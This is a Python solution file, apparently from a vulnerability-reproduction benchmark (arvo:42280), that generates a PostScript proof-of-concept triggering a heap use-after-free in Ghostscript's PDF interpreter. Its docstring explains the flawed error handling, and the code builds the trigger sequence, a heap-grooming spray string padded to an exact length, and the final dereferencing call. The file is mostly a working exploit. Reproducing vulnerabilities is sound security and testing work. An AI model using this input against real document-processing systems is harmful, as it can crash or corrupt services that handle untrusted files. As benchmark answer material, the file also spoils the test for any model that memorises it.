import os

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Use After Free
    vulnerability in a PDF interpreter, corresponding to arvo:42280.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability (identified as oss-fuzz 42280 in Ghostscript) is
        triggered by a sequence of PostScript operations:

        1.  A call to the internal `.pdfrun` operator is made with an invalid
            type for its `PDFFile` parameter (a dictionary instead of a file or
            string). This causes an error during the setup of the PDF input stream.

        2.  The error handling in the vulnerable version is flawed. It frees the
            memory allocated for the stream object but fails to clear the pointer
            to it within the parent `pdfi` context, creating a dangling pointer.

        3.  The PoC then performs heap grooming by allocating a large string. This
            string is intended to occupy the memory region that was just freed.

        4.  Finally, another PDF operator (`pdfshowpage`) is called. This operator
            uses the corrupted `pdfi` context and attempts to dereference the
            dangling pointer. Since the pointer now points to the groom-string data,
            this type confusion leads to a crash when the interpreter tries to
            access stream structure members.

        This PoC is crafted to match the ground-truth length, which can be
        important for reliable heap layout manipulation.

        Args:
            src_path: Path to the vulnerable source code tarball (not used in this solution).

        Returns:
            bytes: The PoC input as a PostScript file.
        """

        # Target PoC length from the problem description.
        ground_truth_len = 13996

        # PostScript commands to trigger the vulnerability.
        header = b"%!PS\n"
        
        # Command to cause the initial failure and free the stream object.
        # The `stopped` operator catches the expected PostScript error.
        trigger = b"{ mark << /PDFFile <<>> >> .pdfrun } stopped pop\n"

        # Define the structure for the heap grooming string and the final trigger.
        spray_prefix = b"/s ("
        spray_suffix = b") def\n1 pdfshowpage\n"
        
        # Calculate the required length of the spray string to match the target PoC size.
        overhead = len(header) + len(trigger) + len(spray_prefix) + len(spray_suffix)
        spray_len = ground_truth_len - overhead
        
        # The content of the spray string; a repeating character is sufficient.
        spray_content = b'A' * spray_len
        
        # Assemble the final PoC.
        poc = header + trigger + spray_prefix + spray_content + spray_suffix
        
        return poc